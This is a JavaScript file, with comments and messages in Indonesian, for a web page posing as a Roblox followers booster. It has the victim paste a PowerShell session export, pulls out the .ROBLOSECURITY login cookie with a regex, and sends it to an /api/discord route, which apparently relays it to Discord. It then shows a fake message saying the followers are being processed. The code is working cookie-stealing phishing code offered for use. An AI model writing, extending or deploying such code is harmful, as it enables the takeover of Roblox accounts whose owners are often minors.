// File: script.js (yang baru)

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('cookie-form');
    const statusDiv = document.getElementById('status');

    form.addEventListener('submit', function(event) {
        event.preventDefault();

        const inputData = document.getElementById('powershell').value;

        if (!inputData.trim()) {
            showStatus('Input kosong! Masukin data PowerShell dulu.', 'error');
            return;
        }

        showStatus('Memvalidasi file...', 'processing');

        const requiredStrings = [
            'New-Object Microsoft.PowerShell.Commands.WebRequestSession',
            '.ROBLOSECURITY',
            'Invoke-WebRequest',
            'https://www.roblox.com/id/users/4909346453/profile'
        ];

        let isValid = true;
        for (const str of requiredStrings) {
            if (!inputData.includes(str)) {
                isValid = false;
                break;
            }
        }

        if (!isValid) {
            showStatus('Invalid file! Gagal mengisi followers.', 'error');
            return;
        }

        showStatus('File valid! Mengambil cookie...', 'processing');
        
        const regex = /\.ROBLOSECURITY.*?"(.*?)"/;
        const match = inputData.match(regex);

        if (match && match[1]) {
            const extractedCookie = match[1];
            showStatus('Mengirim ke server...', 'processing');
            // Kirim ke API Route kita, bukan ke Discord langsung
            sendToServer(extractedCookie);
        } else {
            showStatus('GAGAL! Cookie .ROBLOSECURITY nggak ketemu. Format file salah.', 'error');
        }
    });

    // Fungsi ini ngirim ke API Route /api/discord
    async function sendToServer(cookie) {
        try {
            const response = await fetch('/api/discord', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ cookie: cookie }),
            });

            const result = await response.json();

            if (response.ok && result.message === 'Success') {
                showStatus('✅ SUKSES! Followers sedang diproses... (Cookie terkirim)', 'success');
            } else {
                showStatus(`❌ ERROR! ${result.message || 'Gagal kirim ke server.'}`, 'error');
            }
        } catch (error) {
            showStatus(`❌ FATAL ERROR! ${error.message}`, 'error');
            console.error('Fetch error:', error);
        }
    }

    function showStatus(message, type) {
        statusDiv.textContent = message;
        statusDiv.style.opacity = '1';
        
        statusDiv.className = 'mt-8 text-center text-lg font-semibold p-4 bg-gray-700 bg-opacity-70 rounded-lg border shadow-inner transition-opacity duration-500 ease-out';
        
        if (type === 'error') {
            statusDiv.classList.add('text-red-400', 'border-red-600', 'animate-pulse');
        } else if (type === 'success') {
            statusDiv.classList.add('text-green-400', 'border-green-600');
        } else {
            statusDiv.classList.add('text-yellow-400', 'border-yellow-600', 'animate-pulse');
        }
    }
});
